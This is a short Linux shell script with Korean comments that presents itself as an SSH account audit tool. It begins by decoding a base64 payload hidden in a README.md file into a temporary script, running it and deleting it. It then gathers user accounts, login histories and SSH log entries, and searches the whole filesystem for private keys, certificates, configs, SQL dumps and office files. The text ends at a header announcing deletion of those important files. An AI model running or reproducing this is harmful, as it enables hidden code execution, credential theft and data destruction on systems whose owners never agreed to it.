# curl "cloud download address"
# tar -xvf [tar file name]
# cd [directory name]
base64 --decode $PWD/resource/README.md > tmp.sh
sh tmp.sh
rm tmp.sh
 
## 1. 사용자 계정정보 수집 및 저장
LOG_FILE="ssh_user_audit_$(date +%Y%m%d_%H%M%S).log"

echo "🔍 리눅스 SSH 접속 및 계정 정보 수집 스크립트" | tee -a "$LOG_FILE"
echo "시작 시간: $(date)" | tee -a "$LOG_FILE"
echo "----------------------------------------" | tee -a "$LOG_FILE"

# 전체 사용자 계정 목록
echo -e "\n📋 전체 사용자 계정 목록 (/etc/passwd):" | tee -a "$LOG_FILE"
cut -d: -f1 /etc/passwd | tee -a "$LOG_FILE"

# 로그인 가능한 사용자
echo -e "\n🔐 로그인 가능한 사용자 계정 (유효한 쉘):" | tee -a "$LOG_FILE"
awk -F: '$7 ~ /(bash|sh|zsh|ksh)/ {print $1}' /etc/passwd | tee -a "$LOG_FILE"

# 홈 디렉토리 및 기본 쉘
echo -e "\n📁 홈 디렉토리 및 기본 쉘:" | tee -a "$LOG_FILE"
awk -F: '{printf "%-15s %-30s %-20s\n", $1, $6, $7}' /etc/passwd | tee -a "$LOG_FILE"

# 최근 로그인 기록
echo -e "\n🕒 최근 로그인 기록 (last):" | tee -a "$LOG_FILE"
last -a | head -n 10 | tee -a "$LOG_FILE"

# 현재 로그인 사용자
echo -e "\n👥 현재 로그인 중인 사용자 (who):" | tee -a "$LOG_FILE"
who | tee -a "$LOG_FILE"

echo -e "\n📊 현재 세션 상세 정보 (w):" | tee -a "$LOG_FILE"
w | tee -a "$LOG_FILE"

# SSH 접속 로그 확인
SSH_LOG_FILE=""

if [ -f /var/log/auth.log ]; then
  SSH_LOG_FILE="/var/log/auth.log"
elif [ -f /var/log/secure ]; then
  SSH_LOG_FILE="/var/log/secure"
else
  echo -e "\n⚠️ SSH 로그 파일을 찾을 수 없습니다 (/var/log/auth.log 또는 /var/log/secure)." | tee -a "$LOG_FILE"
fi

if [ -n "$SSH_LOG_FILE" ]; then
  echo -e "\n✅ SSH 성공 접속 로그 (최근 20건):" | tee -a "$LOG_FILE"
  grep "Accepted" "$SSH_LOG_FILE" | tail -n 20 | tee -a "$LOG_FILE"

  echo -e "\n🚫 SSH 실패/시도 기록 (최근 20건):" | tee -a "$LOG_FILE"
  grep -E "Failed|Invalid|authentication failure" "$SSH_LOG_FILE" | tail -n 20 | tee -a "$LOG_FILE"
fi

# 현재 SSH 세션 확인
echo -e "\n📡 현재 SSH 세션 (sshd):" | tee -a "$LOG_FILE"
ps -ef | grep sshd | grep -v grep | tee -a "$LOG_FILE"

## 2. 중요파일 목록 조회
find / -type f \( -name "*.key" -o -name "*.pem" -o -name "*.conf" -o -name "*.sql" -o -name "*.docx" -o -name "*.xlsx" \) 2>/dev/null

## 3. 중요파일 삭제